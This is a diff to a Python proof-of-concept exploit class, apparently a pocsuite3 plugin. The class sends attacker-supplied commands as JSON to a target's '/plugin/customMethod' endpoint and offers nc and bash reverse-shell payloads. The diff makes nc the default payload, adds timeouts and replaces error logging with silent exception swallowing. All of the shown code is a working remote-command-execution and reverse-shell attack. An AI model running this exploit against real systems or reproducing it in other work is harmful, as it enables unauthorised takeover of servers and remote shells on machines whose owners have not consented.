@@ -34,18 +34,17 @@ class DemoPOC(POCBase):
             "nc": REVERSE_PAYLOAD.NC,
             "bash": REVERSE_PAYLOAD.BASH,
         }
-        o["payload"] = OptDict(default=payload, selected="bash")
+        o["payload"] = OptDict(default=payload, selected="nc")
         return o
 
     def _verify(self):
-        print(get_listener_ip())
         result = {}
         url = self.url.rstrip('/') + "/plugin/customMethod"
         data = '{"entry":"Evil","request":"' + self.get_option("command")+ '"}'
         headers = {
             "Content-Type": "application/json"
         }
-        resp = requests.post(url, data=data, headers=headers)
+        resp = requests.post(url, data=data, headers=headers, timeout=5)
         try:
             if 'success' in resp.text and resp.status_code == 200:
                 result['VerifyInfo'] = {}
@@ -53,7 +52,7 @@ class DemoPOC(POCBase):
                 result['VerifyInfo']['Cmd'] = self.get_option("command")
                 result['VerifyInfo']['Response'] = re.findall(r'{"data":(.*?)"success',resp.text)[0]
         except Exception as ex:
-            logger.error(str(ex))
+            pass
 
         return self.parse_output(result)
 
@@ -71,7 +70,7 @@ class DemoPOC(POCBase):
         headers = {
             "Content-Type": "application/json"
         }
-        resp = requests.post(url, data=data, headers=headers)
+        resp = requests.post(url, data=data, headers=headers, timeout=5)
         try:
             if 'success' in resp.text and resp.status_code == 200:
                 result['VerifyInfo'] = {}
@@ -79,7 +78,7 @@ class DemoPOC(POCBase):
                 result['VerifyInfo']['Cmd'] = cmd
                 result['VerifyInfo']['Response'] = re.findall(r'{"data":(.*?)"success',resp.text)[0]
         except Exception as ex:
-            logger.error(str(ex))
+            pass
 
         return self.parse_output(result)
 
